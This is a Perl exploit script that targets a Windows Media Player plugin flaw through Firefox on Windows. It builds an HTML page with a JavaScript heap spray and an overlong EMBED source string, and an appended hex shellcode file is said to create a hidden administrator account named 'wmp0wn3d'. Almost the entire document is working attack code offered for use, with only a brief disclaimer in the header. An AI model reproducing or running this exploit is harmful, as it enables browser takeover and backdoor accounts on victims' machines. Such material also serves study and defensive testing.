#!/usr/bin/perl
#
# wmp-profiteer.pl
# Exploiting 'Non-Critical' Media Player Vulnerabilities for Fun and 
Profit
# By Matthew Murphy (mattmurphy@kc.rr.com)
#
# It's come to my attention that the HTML versions of the exploit posted 
on
# several sites have become mangled. Notables include SecuriTeam and 
FrSIRT.
# Neither one, though, can beat SecurityFocus, whose links to the exploits
# for this issue are both 404s.
#
# I haven't updated the underlying exploit methodology -- it's still a 
shameless
# rip of Skylined's heap spray technique, but now the shellcode can be
# customized!
#
# The usage of this tool is as follows:
#
# wmp-profiteer.pl [shellcode]
#
# The shellcode that comes with this has the same payload as the original.
# If it's successful against you, you'll have an administrator account 
named
# 'wmp0wn3d' with a password of 'password'. This, of course, assumes that
# you're running the vulnerable application as an administrator. There's a 
# lesson in that: run as a Limited User or at least tie down your browsers
# with Software Restriction.
#
# This will drop 'wmp-exploit.html' in the current directory. When the 
HTML
# document is opened locally or viewed remotely by a vulnerable web 
browser
# (Firefox on Windows), the exploit code will run and gain control of the
# browser.
#
# The standard disclaimer from the original exploit still applies, with 
some 
# changes:
#
# This exploit code is intended only as a demonstration tool for
# educational or testing purposes. It is not intended to be used for any
# unauthorized or illicit purpose. Any testing done with this tool OR ANY
# PRODUCT OR ALTERATION THEREOF must be limited to systems that you own or 
# are explicitly authorized to test.
#
# By utilizing or possessing this code, you assume any and all
# responsibility for damage that results. The author will not be held
# responsible, under any circumstances, for damage that arises from your
# possession or use of this code.

$part1 =
"<!DOCTYPE HTML PUBLIC \"-//W3C DTD HTML 4.01 Transitional//EN\">
<HTML>
<HEAD>
<TITLE>WMP EMBED Exploit by Matthew Murphy</TITLE>
<SCRIPT>
var spray = 
unescape(\"%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141\");
do {
spray += spray;
} while (spray.length < 0x1000000);
spray += unescape(\"";

$part2 =
"\");
</SCRIPT>
</HEAD>
<BODY BGCOLOR=\"#FFFFFF\" TEXT=\"#000000\">
<EMBED SRC=\"";

$part3 =
"\"></EMBED>
</BODY>
</HTML>";

if (@ARGV != 1) {
print STDERR "Usage: $0 [shellcode file]";
}

open(EXPLOIT, ">./wmp-exploit.html") or die "Cannot open 'wmp-exploit.html 
for writing.";
print EXPLOIT $part1;

open(SHELLCODE, $ARGV[0]) or die "Shellcode file not found.";
while (!eof(SHELLCODE)) {
$ch1 = getc(SHELLCODE);
if (eof(SHELLCODE)) {
print EXPLOIT "%u00";
print EXPLOIT sprintf("%%u00%.2x", ord($ch1));
} else {
$ch2 = getc(SHELLCODE);
print EXPLOIT sprintf("%%u%.2x%.2x", ord($ch2), ord($ch1));
}
}
close(SHELLCODE);

print EXPLOIT $part2;
print EXPLOIT "-"x2038;
print EXPLOIT "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL";
print EXPLOIT "AAA\x05";
print EXPLOIT "NNNNOOOO";
print EXPLOIT "AAA\x05";
print EXPLOIT 
"QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999.wmv";
print EXPLOIT $part3;
close(EXPLOIT);

----------------------------------------------- shellcode.hex 
-----------------------------------------

:020000040000FA
:100000002BC983E9C9D9EED97424F45B8173132118
:10001000C414F183EBFCE2F4DD2C50F121C49FB455
:100020001D4F68F459C5FB7A6EDC9FAE01C5FFB861
:10003000AAF09FF0CFF5D4688D40D4852605DEFC6C
:100040002006FF051A9030F554219FAE05C5FF9795
:10005000AAC85F7A7ED8151AAAD89FF0CA4D48D58B
:1000600025072531454F54C1A4046CFDAA84187A94
:1000700051D8B97A49CCFFF8AA44A4F121C49F9978
:100080001D9B250741929D09A2046FA149349EF54D
:100090007EAC8C0FABCA430EC6A779950FA16C94AA
:1000A00001EB77D14FA160D154B7718301B379814E
:1000B00011B37AC245E4649052B7639E53A034DE14
:1000C000608050D107E2349F44B0349D4EA7759DA7
:1000D00046B67B8451E455954CAD7A9852B0669003
:1000E00055AB668201B3798111B37AC245E43BB066
:0400F000658014F122
:00000001FF
